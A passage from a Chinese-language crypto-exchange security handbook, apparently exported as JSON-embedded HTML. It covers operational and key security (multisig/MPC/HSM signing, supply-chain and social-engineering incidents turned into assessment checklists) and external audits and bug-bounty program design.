class=\"table-wrap\"><table>\n<thead>\n<tr>\n<th>术语<\/th>\n<th>英文<\/th>\n<th>定义<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td>尽职调查<\/td>\n<td>Due Diligence (DD)<\/td>\n<td>决策前对对象的核查<\/td>\n<\/tr>\n<tr>\n<td>貔貅盘<\/td>\n<td>Honeypot<\/td>\n<td>能买不能卖的代币<\/td>\n<\/tr>\n<tr>\n<td>持仓集中度<\/td>\n<td>Holder Concentration<\/td>\n<td>代币被少数地址持有的程度<\/td>\n<\/tr>\n<tr>\n<td>放弃所有权<\/td>\n<td>Renounce Ownership<\/td>\n<td>将 owner 设为零地址,永久放弃特权<\/td>\n<\/tr>\n<tr>\n<td>锁仓<\/td>\n<td>Vesting / Lock<\/td>\n<td>代币或流动性在一段时间内不可转移<\/td>\n<\/tr>\n<tr>\n<td>观察区<\/td>\n<td>Watch Zone<\/td>\n<td>风险较高、限额或限期的上币层级<\/td>\n<\/tr>\n<\/tbody><\/table><\/div>\n<hr>\n<h2>9. 思考题<\/h2>\n<ol>\n<li>一个项目综合评分很高,但代币合约的升级权是一个单签 EOA。按本章,你的结论是什么?为什么单项红线能推翻高分?<\/li>\n<li>项目方提供了知名审计公司的报告。你还要做哪三件事才能相信它?<\/li>\n<li>为什么说&quot;刚部署几天的项目风险高&quot;?如果交易所的业务就是要上新项目,怎样用上线条件来缓解?<\/li>\n<\/ol>\n<p>下一章：<a href=\"#a06\" data-nav=\"a06\">A06 运营与密钥安全<\/a><\/p>\n"}, "a06": {"id": "a06", "file": "assessment/A06-operational-key-security.md", "title": "A06 运营与密钥安全：代码之外的战场", "group": "asm", "html": "<h1>A06 运营与密钥安全：代码之外的战场<\/h1>\n<blockquote class=\"\"><p>学习目标：读完本章，你能——<\/p>\n<ol>\n<li>说出近年最大损失的四个链下根因:私钥与签名、前端与供应链、部署流水线、社会工程。<\/li>\n<li>评估一套密钥管理方案(多签 / MPC / HSM)的真实安全,而不只是看阈值。<\/li>\n<li>把五起链下事故(Bybit、WazirX、Radiant、DMM、BadgerDAO、Ledger)映射到可检查的评估项。<\/li>\n<\/ol>\n<p>前置章节：<a href=\"#a03\" data-nav=\"a03\">A03 交易所合约与钱包<\/a>、<a href=\"#c08\" data-nav=\"c08\">08 签名安全<\/a><br>交互实验：<a href=\"#lab-incident-explorer\" data-nav=\"lab-incident-explorer\" class=\"lab-link\">incident-explorer.html<\/a><\/p>\n<\/blockquote>\n<hr>\n<h2>1. 一句话理解<\/h2>\n<p><strong>合约审计覆盖的是&quot;代码会不会出错&quot;。但近年最大的损失,几乎都不在代码里:私钥被骗走、前端被调包、部署流水线被污染、员工被钓鱼。评估不覆盖链下,等于只锁了保险柜,没锁保险柜所在的房间。<\/strong><\/p>\n<blockquote class=\"analogy\"><p>🎯 打个比方：合约是保险柜,运营安全是保险柜所在的整栋楼。<\/p>\n<ul>\n<li>保险柜(合约)用最好的钢材(审计过)。<\/li>\n<li>但保安被收买(私钥泄露)、门禁系统被改(前端注入)、送货通道被人掉包(供应链)、保洁被冒充(社会工程),保险柜再硬也没用。<\/li>\n<\/ul>\n<p>比喻的局限:楼里的问题可以装监控、派人巡逻。链上资产一旦被转走,没有保险公司理赔,没有警察追回(多数情况下)。<\/p>\n<\/blockquote>\n<hr>\n<h2>2. 四类链下根因<\/h2>\n<div class=\"mmd-wrap\"><pre class=\"mmd\">flowchart TB\n  subgraph K[&quot;① 私钥与签名&quot;]\n    K1[&quot;多签签名流程被攻破&lt;br/&gt;Bybit、WazirX、Radiant&quot;]\n    K2[&quot;签名终端 / 基础设施被入侵&lt;br/&gt;DMM、Radiant&quot;]\n  end\n  subgraph F[&quot;② 前端与供应链&quot;]\n    F1[&quot;前端被注入恶意脚本&lt;br/&gt;BadgerDAO&quot;]\n    F2[&quot;依赖库被投毒&lt;br/&gt;Ledger Connect Kit&quot;]\n    F3[&quot;DNS / 域名劫持&quot;]\n  end\n  subgraph P[&quot;③ 部署与运维&quot;]\n    P1[&quot;部署 / 升级流水线被污染&quot;]\n    P2[&quot;CI 密钥、运维密钥泄露&quot;]\n  end\n  subgraph S[&quot;④ 社会工程&quot;]\n    S1[&quot;假招聘 / 假承包商&lt;br/&gt;DMM、Radiant&quot;]\n    S2[&quot;钓鱼邮件 / 消息&quot;]\n  end<\/pre><\/div>\n<p><strong>读图要点:<\/strong><\/p>\n<ul>\n<li>四类常常组合:社会工程(④)是入口,导致私钥 / 终端(①)或流水线(③)被攻破。<\/li>\n<li>这些攻击的发起方常是有国家背景的长期团队(公开报道多指向朝鲜 Lazarus / TraderTraitor)。评估要按&quot;对方会渗透数月&quot;来设防。<\/li>\n<li>局限:本图是攻击面,不是完整的企业安全体系。完整体系还包括身份认证、网络隔离、日志审计等,超出合约安全评估范围,但评估报告应指出哪些需要安全团队跟进。<\/li>\n<\/ul>\n<hr>\n<h2>3. 私钥与签名评估<\/h2>\n<h3>3.1 密钥管理方案对比<\/h3>\n<div class=\"table-wrap\"><table>\n<thead>\n<tr>\n<th>方案<\/th>\n<th>原理<\/th>\n<th>优点<\/th>\n<th>要评估的风险<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td>单签 EOA<\/td>\n<td>一把私钥<\/td>\n<td>简单<\/td>\n<td>单点;绝不用于金库<\/td>\n<\/tr>\n<tr>\n<td>多签合约(Safe)<\/td>\n<td>M-of-N 链上合约<\/td>\n<td>成熟、透明<\/td>\n<td>签名流程(见下);module / guard 扩展点;升级<\/td>\n<\/tr>\n<tr>\n<td>MPC<\/td>\n<td>私钥分片,多方协同签名<\/td>\n<td>无完整私钥落地;链上看是单签<\/td>\n<td>分片的分发与存储;实现方的可信度;签名审批流程<\/td>\n<\/tr>\n<tr>\n<td>HSM<\/td>\n<td>硬件内保管并签名<\/td>\n<td>私钥不出硬件<\/td>\n<td>访问控制;谁能让 HSM 签名;物理安全<\/td>\n<\/tr>\n<\/tbody><\/table><\/div>\n<div class=\"lv-figcap\"><span>图 · 合法签名人被骗签名<\/span><span class=\"new\">新增图解<\/span><\/div><div class=\"mmd-wrap\"><pre class=\"mmd\">sequenceDiagram\n  participant A as 攻击者\n  participant T as 签名终端 / 交易展示\n  participant S as 合法签名人\n  participant W as 多签 / MPC / HSM\n  participant C as 链上金库\n  A-&gt;&gt;T: 入侵终端或篡改展示内容\n  T-&gt;&gt;S: 显示一笔看似正常的交易\n  S-&gt;&gt;W: 按流程批准签名\n  W-&gt;&gt;C: 提交合法签名的恶意交易\n  C--&gt;&gt;A: 资金被转走\n  Note over S,W: 私钥从未被直接偷走\n  Note over T,S: 防线 独立工具解码核对交易<\/pre><\/div>\n<p><strong>读图要点：<\/strong><\/p>\n<ul><li><strong>关键：<\/strong>MPC 和 HSM 只保证私钥不完整落地，不管谁授权、签的是什么。<\/li><li><strong>出错点：<\/strong>出错点在签名人看到的内容和实际签的内容不一致。<\/li><li><strong>风险：<\/strong>签名终端被入侵后，阈值再高也挡不住被骗的签名人。<\/li><li><strong>数据流：<\/strong>所以签名流程评估对任何密钥方案都适用。<\/li><\/ul>\n\n<blockquote class=\"info\"><p>💡 注意:MPC 和 HSM 解决的是&quot;私钥不以完整形态落地&quot;,<strong>没有<\/strong>解决&quot;谁来授权签名、签的是什么&quot;。Bybit、WazirX、Radiant 的问题都不是私钥被直接偷走,而是<strong>合法的签名人被骗着授权了恶意交易<\/strong>。所以签名流程评估(A03 第 4 节)对任何方案都适用。<\/p>\n<\/blockquote>\n<h3>3.2 评估清单<\/h3>\n<ul>\n<li><input disabled=\"\" type=\"checkbox\"> 签名人独立性:不同的人、组织、地点、设备?多少把钥匙实际由同一方控制?<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 签名终端:专机专用?隔离?能否收文件、装软件、上网?(Radiant:开发者终端中木马)<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 交易展示与独立解码:签名人看到的和签的是否一致?是否用独立工具解码核对?(Bybit、WazirX)<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 高危操作审批:升级、换签名人、delegatecall、transferOwnership 是否额外审批 + 带外确认?<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 时间锁与限额:大额转出时间锁?单位时间提币上限与告警?<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 密钥轮换与撤销:离职 / 换岗后的密钥与权限是否及时撤销?(Ledger:前员工 npm 权限未撤销)<\/li>\n<\/ul>\n<hr>\n<h2>4. 前端与供应链评估<\/h2>\n<p>合约再安全,用户是通过前端交互的。前端被攻破,用户直接授权给攻击者。<\/p>\n<h3>4.1 评估清单<\/h3>\n<ul>\n<li><input disabled=\"\" type=\"checkbox\"> 前端托管:谁能改线上代码?CDN / Cloudflare / 托管平台的访问控制与密钥?(BadgerDAO:Cloudflare 账户的 API key 被用于注入脚本)<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 依赖锁定:npm / 第三方库是否锁定到具体版本?是否通过第三方 CDN 镜像加载?(Ledger Connect Kit:1.1.5–1.1.7 被投毒)<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 子资源完整性:关键外部脚本是否用 SRI(Subresource Integrity)校验?<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> DNS 与域名:域名注册商账户的保护?DNS 记录的变更审批?(Curve 等曾遭 DNS 劫持)<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 钱包交互透明:前端请求用户签名 / 授权时,是否清晰展示对象、金额、是否无限授权?<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 监控:前端代码完整性监控?异常授权激增告警?<\/li>\n<\/ul>\n<h3>4.2 案例:两种供应链攻击<\/h3>\n<div class=\"table-wrap\"><table>\n<thead>\n<tr>\n<th>事故<\/th>\n<th>入口<\/th>\n<th>恶意行为<\/th>\n<th>评估项<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td>BadgerDAO(2021-12,约 1.2 亿美元)<\/td>\n<td>Cloudflare 账户 API key 被获取<\/td>\n<td>注入脚本,诱导用户给攻击者无限授权;500 个钱包中招<\/td>\n<td>前端托管访问控制;无限授权展示<\/td>\n<\/tr>\n<tr>\n<td>Ledger Connect Kit(2023-12,约 60 万美元)<\/td>\n<td>前员工 npm 账户被钓鱼,权限未撤销<\/td>\n<td>发布恶意版本,运行 Drainer 转走资产<\/td>\n<td>依赖锁定;离职权限撤销;SRI<\/td>\n<\/tr>\n<\/tbody><\/table><\/div>\n<div class=\"lv-figcap\"><span>图 · 两条供应链攻击链<\/span><span class=\"new\">新增图解<\/span><\/div><div class=\"mmd-wrap\"><pre class=\"mmd\">flowchart LR\n  subgraph SB[\"BadgerDAO\"]\n    B1[\"Cloudflare 账户&lt;br/&gt;API key 被获取\"] --&gt; B2[\"前端被注入脚本\"]\n    B2 --&gt; B3[\"诱导用户&lt;br/&gt;无限授权给攻击者\"]\n    B3 --&gt; B4[\"500 个钱包中招\"]\n  end\n  subgraph SL[\"Ledger Connect Kit\"]\n    L1[\"前员工 npm 账户被钓鱼&lt;br/&gt;权限未撤销\"] --&gt; L2[\"发布恶意版本&lt;br/&gt;1.1.5–1.1.7\"]\n    L2 --&gt; L3[\"运行 Drainer\"]\n    L3 --&gt; L4[\"用户资产被转走\"]\n  end\n  B4 -.-&gt; D1[\"评估项：前端托管访问控制&lt;br/&gt;无限授权展示\"]\n  L4 -.-&gt; D2[\"评估项：依赖锁定&lt;br/&gt;离职权限撤销 · SRI\"]<\/pre><\/div>\n<p><strong>读图要点：<\/strong><\/p>\n<ul><li><strong>数据流：<\/strong>两起事故都没碰合约代码，恶意内容经前端或依赖库直接送到用户面前。<\/li><li><strong>风险：<\/strong>用户一签授权，资产就流向攻击者。<\/li><li><strong>出错点：<\/strong>Ledger 的入口是离职员工的 npm 权限没有及时撤销。<\/li><li><strong>关键：<\/strong>每条攻击链都能映射成一条可检查的评估项。<\/li><\/ul>\n\n<hr>\n<h2>5. 部署与运维评估<\/h2>\n<ul>\n<li><input disabled=\"\" type=\"checkbox\"> 部署用脚本,脚本经评审;部署与初始化原子化(见 <a href=\"#c09\" data-nav=\"c09\">09<\/a>)。<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 部署后验证:源码验证、关键参数读取核对、权限移交确认。<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> CI / CD 密钥:部署私钥、API key 不进代码库;用密钥管理服务;最小权限。<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 升级流程:经时间锁;公开;部署后跑验证脚本;保留回滚方案。<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 变更管理:任何链上变更有审批、有记录、可追溯。<\/li>\n<\/ul>\n<hr>\n<h2>6. 社会工程评估<\/h2>\n<p>技术防御再强,人仍是最软的一环。近年多起大案的入口都是社会工程:<\/p>\n<div class=\"table-wrap\"><table>\n<thead>\n<tr>\n<th>事故<\/th>\n<th>手法<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td>DMM Bitcoin(2024,约 3.05 亿美元)<\/td>\n<td>冒充招聘者在 LinkedIn 接触钱包服务商 Ginco 员工,诱其运行&quot;入职测试&quot;代码,终端被控,进而操纵交易请求<\/td>\n<\/tr>\n<tr>\n<td>Radiant(2024,约 5,000 万美元)<\/td>\n<td>冒充前承包商在 Telegram 发送伪装成报告的恶意文件,开发者终端中木马,并转发给同事扩散<\/td>\n<\/tr>\n<\/tbody><\/table><\/div>\n<p><strong>评估要点:<\/strong><\/p>\n<ul>\n<li><input disabled=\"\" type=\"checkbox\"> 团队是否有反社会工程的培训与意识,尤其是开发和签名人员?<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 是否有&quot;不在签名 / 部署终端上打开外部文件、链接、运行外部代码&quot;的硬性规定?<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 招聘、承包、合作流程中的身份核验?<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 高危操作是否要求多人、带外确认,使单个人被攻破不足以造成损失?<\/li>\n<\/ul>\n<blockquote class=\"warn\"><p>⚠️ 警告:对合作 / 上币项目做尽调时(见 <a href=\"#a05\" data-nav=\"a05\">A05<\/a>),对方的运营安全薄弱会通过深度合作传导给交易所。合作越深(共享金库、共同部署),越要把对方的运营安全纳入评估。<\/p>\n<\/blockquote>\n<hr>\n<h2>7. 运营安全在评估中的位置<\/h2>\n<div class=\"table-wrap\"><table>\n<thead>\n<tr>\n<th>评估对象<\/th>\n<th>运营安全的权重<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td>交易所自有合约与钱包(<a href=\"#a03\" data-nav=\"a03\">A03<\/a>)<\/td>\n<td>最高:签名流程与密钥管理是第一重点<\/td>\n<\/tr>\n<tr>\n<td>自研 DeFi 协议(<a href=\"#a04\" data-nav=\"a04\">A04<\/a>)<\/td>\n<td>高:部署、升级权限、前端、监控<\/td>\n<\/tr>\n<tr>\n<td>上币 / 合作尽调(<a href=\"#a05\" data-nav=\"a05\">A05<\/a>)<\/td>\n<td>中高:通过问卷了解;深度合作时提升<\/td>\n<\/tr>\n<\/tbody><\/table><\/div>\n<p>运营安全的许多项超出&quot;合约安全评估&quot;的传统边界,但损失就发生在这里。评估报告即使不能亲自验证所有链下环节,也要<strong>明确列出需要企业安全团队跟进的项<\/strong>,而不是当作&quot;不在范围内&quot;略过。<\/p>\n<hr>\n<h2>8. 术语表<\/h2>\n<div class=\"table-wrap\"><table>\n<thead>\n<tr>\n<th>术语<\/th>\n<th>英文<\/th>\n<th>定义<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td>供应链攻击<\/td>\n<td>Supply Chain Attack<\/td>\n<td>通过污染依赖、工具或分发渠道间接攻击<\/td>\n<\/tr>\n<tr>\n<td>子资源完整性<\/td>\n<td>SRI, Subresource Integrity<\/td>\n<td>用哈希校验外部脚本未被篡改<\/td>\n<\/tr>\n<tr>\n<td>投毒<\/td>\n<td>Poisoning<\/td>\n<td>向依赖库或镜像植入恶意代码<\/td>\n<\/tr>\n<tr>\n<td>社会工程<\/td>\n<td>Social Engineering<\/td>\n<td>通过欺骗人获取访问权限<\/td>\n<\/tr>\n<tr>\n<td>专机<\/td>\n<td>Air-gapped / Dedicated Device<\/td>\n<td>隔离、专用于敏感操作的设备<\/td>\n<\/tr>\n<tr>\n<td>带外确认<\/td>\n<td>Out-of-band Verification<\/td>\n<td>通过独立渠道二次确认<\/td>\n<\/tr>\n<\/tbody><\/table><\/div>\n<hr>\n<h2>9. 思考题<\/h2>\n<ol>\n<li>一个团队用 MPC 管理私钥,说&quot;没有完整私钥,所以很安全&quot;。参照 Bybit 和 Radiant,指出这个说法的盲区。<\/li>\n<li>你的前端通过第三方 CDN 加载一个钱包连接库。列出至少 3 个降低供应链风险的措施。<\/li>\n<li>为什么说&quot;假招聘&quot;对加密团队特别有效?评估团队运营安全时,你会问哪些问题来发现这类风险?<\/li>\n<\/ol>\n<p>下一章：<a href=\"#a07\" data-nav=\"a07\">A07 外部审计与漏洞赏金管理<\/a><\/p>\n"}, "a07": {"id": "a07", "file": "assessment/A07-external-audit-bounty.md", "title": "A07 外部审计与漏洞赏金管理", "group": "asm", "html": "<h1>A07 外部审计与漏洞赏金管理<\/h1>\n<blockquote class=\"\"><p>学习目标：读完本章，你能——<\/p>\n<ol>\n<li>决定什么时候用外部审计、审计竞赛、形式化验证,以及怎样界定范围。<\/li>\n<li>批判性地阅读一份审计报告,识别它的局限和&quot;已确认风险&quot;。<\/li>\n<li>设计一个漏洞赏金计划,包括奖金分级、范围和响应流程。<\/li>\n<\/ol>\n<p>前置章节：<a href=\"#a01\" data-nav=\"a01\">A01 评估方法论<\/a>、<a href=\"#c12\" data-nav=\"c12\">12 审计与测试<\/a><br>定位:外部审计是你自评的<strong>补充<\/strong>,不是替代。<\/p>\n<\/blockquote>\n<hr>\n<h2>1. 一句话理解<\/h2>\n<p><strong>外部审计不是把安全外包出去,而是给你的自评加一道&quot;没见过这份代码的人&quot;的独立检查。你仍然是风险的最终负责人,所以你要会选审计、会界定范围、会读报告。<\/strong><\/p>\n<blockquote class=\"analogy\"><p>🎯 打个比方：外部审计像<strong>请第二位医生会诊<\/strong>。<\/p>\n<ul>\n<li>你(主治医生)最了解病人,也对结果负责。<\/li>\n<li>请会诊是因为第二双眼睛能发现你的盲区,而不是因为你不想看了。<\/li>\n<li>会诊医生只看你给的检查结果和时间窗口内的情况;他看不到的,责任还在你。<\/li>\n<\/ul>\n<p>比喻的局限:会诊医生有行医资质门槛。审计公司水平参差,范围和深度差异很大,报告质量要自己判断。<\/p>\n<\/blockquote>\n<hr>\n<h2>2. 什么时候用哪种外部检查<\/h2>\n<div class=\"table-wrap\"><table>\n<thead>\n<tr>\n<th>方式<\/th>\n<th>适合<\/th>\n<th>特点<\/th>\n<th>局限<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td>单家审计<\/td>\n<td>常规上线<\/td>\n<td>固定时间、固定团队、深度审查<\/td>\n<td>覆盖面受团队经验限制<\/td>\n<\/tr>\n<tr>\n<td>多家审计<\/td>\n<td>核心协议、大额资金<\/td>\n<td>不同团队侧重不同<\/td>\n<td>成本高;可能重复<\/td>\n<\/tr>\n<tr>\n<td>审计竞赛<\/td>\n<td>需要广覆盖<\/td>\n<td>大量审计者并行;按发现付费<\/td>\n<td>深度不均;需要时间消化报告<\/td>\n<\/tr>\n<tr>\n<td>形式化验证<\/td>\n<td>核心数学、清算、会计、桥验证<\/td>\n<td>数学证明覆盖所有输入<\/td>\n<td>规格编写成本高;只证明写下的性质<\/td>\n<\/tr>\n<tr>\n<td>漏洞赏金<\/td>\n<td>上线后持续<\/td>\n<td>真实攻击者视角;长期<\/td>\n<td>被动;依赖奖金吸引力<\/td>\n<\/tr>\n<\/tbody><\/table><\/div>\n<blockquote class=\"info\"><p>💡 注意:这些方式互补,不互斥。一个核心协议的典型组合是:自评 → 单家或多家审计 → 修复复审 → 上线 → 漏洞赏金长期运行;对核心数学模块再加形式化验证。<\/p>\n<\/blockquote>\n<hr>\n<h2>3. 界定审计范围<\/h2>\n<p>你给审计方的材料,决定了审计的质量。按 <a href=\"#t01\" data-nav=\"t01\">T01 资料清单<\/a> 准备,并明确:<\/p>\n<div class=\"lv-figcap\"><span>图 · 冻结版本与差异审计<\/span><span class=\"new\">新增图解<\/span><\/div><div class=\"mmd-wrap\"><pre class=\"mmd\">flowchart TB\n  FZ[\"冻结代码&lt;br/&gt;给提交哈希，不给分支\"] --&gt; MT[\"提交材料&lt;br/&gt;规格 · 不变量 · 威胁模型 · 自评发现\"]\n  MT --&gt; SC[\"范围包含&lt;br/&gt;链下组件 · 部署脚本与初始化参数\"]\n  SC --&gt; AU[\"外部审计\"]\n  AU --&gt; CH{\"审计后、上线前&lt;br/&gt;代码有改动?\"}\n  CH --&gt;|\"有，哪怕一行\"| DF[\"差异审计\"]\n  CH --&gt;|\"没有\"| LV[\"上线\"]\n  DF --&gt; LV<\/pre><\/div>\n<p><strong>读图要点：<\/strong><\/p>\n<ul><li><strong>关键：<\/strong>审计的是哪个提交，上线的就必须是哪个提交。<\/li><li><strong>风险：<\/strong>审计后上线的新版本没走差异审计，就是未审计代码（PancakeBunny、Uranium）。<\/li><li><strong>出错点：<\/strong>范围外的代码出事，责任仍然在你。<\/li><li><strong>数据流：<\/strong>材料越完整，审计方越不用从零开始。<\/li><\/ul>\n\n<ul>\n<li><input disabled=\"\" type=\"checkbox\"> <strong>提交哈希<\/strong>,不是分支。审计期间代码冻结。<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 范围内 / 外的文件;外部依赖哪些视为可信。<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 规格文档与关键不变量——让审计方知道&quot;应该是什么样&quot;。<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 威胁模型与你的自评发现——不要让审计方从零开始,也不要隐瞒已知问题。<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 链下组件(前端、签名、部署)是否在范围内——默认应该在(见 <a href=\"#a06\" data-nav=\"a06\">A06<\/a>)。<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 部署脚本与初始化参数在范围内(Nomad 类问题出在这里)。<\/li>\n<\/ul>\n<blockquote class=\"warn\"><p>⚠️ 警告:审计范围外的代码出事,仍然是你的责任。PancakeBunny 被利用的是审计<strong>之后<\/strong>上线的新版本。任何在审计后、上线前的改动,都要走差异审计,哪怕&quot;只改了一行&quot;(Uranium)。<\/p>\n<\/blockquote>\n<hr>\n<h2>4. 怎么读一份审计报告<\/h2>\n<p>一份报告拿到手,按这个顺序看:<\/p>\n<div class=\"lv-figcap\"><span>图 · 审计报告阅读顺序<\/span><span class=\"new\">新增图解<\/span><\/div><div class=\"mmd-wrap\"><pre class=\"mmd\">flowchart TB\n  R1[\"① 范围与版本\"] --&gt;|\"审计版本 ≠ 上线版本\"| X1[\"红旗：结论可能不适用\"]\n  R1 --&gt; R2[\"② 方法与工时\"]\n  R2 --&gt;|\"工时极短、范围极大\"| X2[\"红旗：走过场\"]\n  R2 --&gt; R3[\"③ 发现与修复状态\"]\n  R3 --&gt;|\"全部已修复但无复审\"| X3[\"红旗：修复可能引入新问题\"]\n  R3 --&gt; R4[\"④ 已确认风险&lt;br/&gt;项目方选择不修\"]\n  R4 --&gt; J[\"你独立判断是否可接受\"]\n  R4 --&gt; R5[\"⑤ 假设与免责\"]\n  R5 --&gt; RS[\"这些假设 = 你的剩余风险\"]\n  R5 --&gt; R6[\"⑥ 范围外提示\"]\n  R6 --&gt; BL[\"你的盲区\"]<\/pre><\/div>\n<p><strong>读图要点：<\/strong><\/p>\n<ul><li><strong>关键：<\/strong>已确认风险最容易被忽略，却最重要。<\/li><li><strong>出错点：<\/strong>版本对不上时，后面读得再细也没有意义。<\/li><li><strong>局限：<\/strong>报告只覆盖它写明的范围和假设，其余都是你的剩余风险。<\/li><\/ul>\n\n<ol>\n<li><strong>范围与版本<\/strong>:审计的是哪个提交?和你要上线的是不是同一个?哪些文件没审?<\/li>\n<li><strong>方法与工时<\/strong>:人工审查 + 哪些工具?投入多少人天?时间太短的报告覆盖有限。<\/li>\n<li><strong>发现与修复状态<\/strong>:每条发现的等级、是否已修复、是否复审。<\/li>\n<li><strong>&quot;已确认风险 / 已知问题&quot;<\/strong>:这是最容易被忽略、却最重要的部分。它是审计方指出、但项目方选择不修的风险。你要独立判断这些风险是否可接受。<\/li>\n<li><strong>假设与免责<\/strong>:报告假设了什么?(例如&quot;假设预言机可信&quot;&quot;假设 owner 不作恶&quot;)这些假设就是你的剩余风险。<\/li>\n<li><strong>范围外提示<\/strong>:报告常会写&quot;未审计 X&quot;。这些是你的盲区。<\/li>\n<\/ol>\n<h3>4.1 报告的红旗<\/h3>\n<div class=\"table-wrap\"><table>\n<thead>\n<tr>\n<th>红旗<\/th>\n<th>含义<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td>审计版本与上线版本不同<\/td>\n<td>审计结论可能不适用<\/td>\n<\/tr>\n<tr>\n<td>只有&quot;无严重问题&quot;一句话<\/td>\n<td>缺少过程,无法判断覆盖<\/td>\n<\/tr>\n<tr>\n<td>工时极短、范围极大<\/td>\n<td>走过场<\/td>\n<\/tr>\n<tr>\n<td>所有发现都&quot;已修复&quot;但无复审记录<\/td>\n<td>修复可能引入新问题<\/td>\n<\/tr>\n<tr>\n<td>不列假设和范围外<\/td>\n<td>剩余风险不明<\/td>\n<\/tr>\n<\/tbody><\/table><\/div>\n<blockquote class=\"info\"><p>💡 注意:&quot;通过审计&quot;是一种常被滥用的营销话术。做上币尽调时(见 <a href=\"#a05\" data-nav=\"a05\">A05<\/a>),要核验审计报告本身,而不是听信&quot;已审计&quot;。<\/p>\n<\/blockquote>\n<hr>\n<h2>5. 设计漏洞赏金计划<\/h2>\n<p>漏洞赏金是上线后的持续防线,用真实攻击者的视角补充一次性审计。<\/p>\n<h3>5.1 要素<\/h3>\n<div class=\"table-wrap\"><table>\n<thead>\n<tr>\n<th>要素<\/th>\n<th>说明<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td>范围<\/td>\n<td>哪些合约、前端、基础设施在范围内;链上地址明确<\/td>\n<\/tr>\n<tr>\n<td>严重度分级<\/td>\n<td>用 Immunefi 等标准(见 <a href=\"#a02\" data-nav=\"a02\">A02<\/a>),口径一致<\/td>\n<\/tr>\n<tr>\n<td>奖金分级<\/td>\n<td>按严重度设金额;严重级通常按&quot;可能损失的一定比例&quot;封顶<\/td>\n<\/tr>\n<tr>\n<td>排除项<\/td>\n<td>已知问题、测试网、第三方依赖、需要不现实前提的攻击<\/td>\n<\/tr>\n<tr>\n<td>提交与响应流程<\/td>\n<td>接收渠道;响应时限;修复时限;付款流程<\/td>\n<\/tr>\n<tr>\n<td>安全港<\/td>\n<td>善意研究者的法律豁免(Safe Harbor),鼓励白帽上报而非利用<\/td>\n<\/tr>\n<tr>\n<td>KYC 与制裁合规<\/td>\n<td>付款前的合规检查<\/td>\n<\/tr>\n<\/tbody><\/table><\/div>\n<h3>5.2 常见平台<\/h3>\n<p>Immunefi、Cantina、HackenProof 等提供托管的赏金计划与分级标准。自建也可以,但要保证响应速度——白帽发现严重漏洞时,每一小时都可能是攻击者也在找同一个洞。<\/p>\n<blockquote class=\"info\"><p>💡 注意:漏洞赏金不能替代审计和自评。它是被动的、依赖运气和奖金吸引力的最后一道网,不是第一道防线。<\/p>\n<\/blockquote>\n<hr>\n<h2>6. 内外协作的职责边界<\/h2>\n<div class=\"mmd-wrap\"><pre class=\"mmd\">flowchart LR\n  SELF[&quot;你 / 内部评估&lt;br/&gt;(主责)&quot;] --&gt; SCOPE[&quot;界定范围、冻结版本&quot;]\n  SCOPE --&gt; EXT[&quot;外部审计 / 竞赛&lt;br/&gt;(独立检查)&quot;]\n  EXT --&gt; READ[&quot;你批判性阅读报告&lt;br/&gt;判断剩余风险&quot;]\n  READ --&gt; GATE[&quot;你做门禁结论&quot;]\n  GATE --&gt; LIVE[&quot;上线&quot;]\n  LIVE --&gt; BOUNTY[&quot;漏洞赏金&lt;br/&gt;(持续)&quot;]\n  BOUNTY -. &quot;新发现&quot; .-&gt; SELF<\/pre><\/div>\n<p><strong>读图要点:<\/strong><\/p>\n<ul>\n<li>主责始终在内部。外部审计是输入,不是决策。门禁结论由你做。<\/li>\n<li>外部发现的问题回流到内部评估,触发修复与(必要时)重新评估。<\/li>\n<li>局限:这条链假设内部有能力读懂并判断审计报告。能力不足时,&quot;外包安全&quot;就变成了&quot;外包责任的错觉&quot;——这正是本手册要帮你避免的。<\/li>\n<\/ul>\n<hr>\n<h2>7. 术语表<\/h2>\n<div class=\"table-wrap\"><table>\n<thead>\n<tr>\n<th>术语<\/th>\n<th>英文<\/th>\n<th>定义<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td>审计竞赛<\/td>\n<td>Audit Contest<\/td>\n<td>多名审计者并行审查、按发现付费<\/td>\n<\/tr>\n<tr>\n<td>形式化验证<\/td>\n<td>Formal Verification<\/td>\n<td>用数学证明代码满足规格<\/td>\n<\/tr>\n<tr>\n<td>差异审计<\/td>\n<td>Diff Audit<\/td>\n<td>只审相对已审版本的改动<\/td>\n<\/tr>\n<tr>\n<td>已确认风险<\/td>\n<td>Acknowledged Risk<\/td>\n<td>审计指出、项目方选择不修的风险<\/td>\n<\/tr>\n<tr>\n<td>安全港<\/td>\n<td>Safe Harbor<\/td>\n<td>对善意安全研究者的法律豁免<\/td>\n<\/tr>\n<tr>\n<td>漏洞赏金<\/td>\n<td>Bug Bounty<\/td>\n<td>向上报漏洞的研究者付费的持续计划<\/td>\n<\/tr>\n<\/tbody><\/table><\/div>\n<hr>\n<h2>8. 